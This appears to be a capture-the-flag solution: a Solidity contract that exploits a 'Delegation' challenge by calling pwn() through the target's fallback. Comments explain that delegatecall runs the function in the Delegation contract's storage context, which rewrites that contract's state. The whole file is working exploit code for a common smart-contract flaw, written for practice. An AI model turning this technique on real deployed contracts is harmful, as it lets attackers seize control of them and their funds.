// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        contractAddress.call(abi.encodeWithSignature("pwn()"));
    }
}

// Plan: 
// Call the fallback function & encode a function call for pwn()
// What context will this function call be executed in? -> The Delegation contract
// It will call the Delegate::pwn func in the context of the Delegation 
// contract and hence it will modify the storage of the Delegation contract
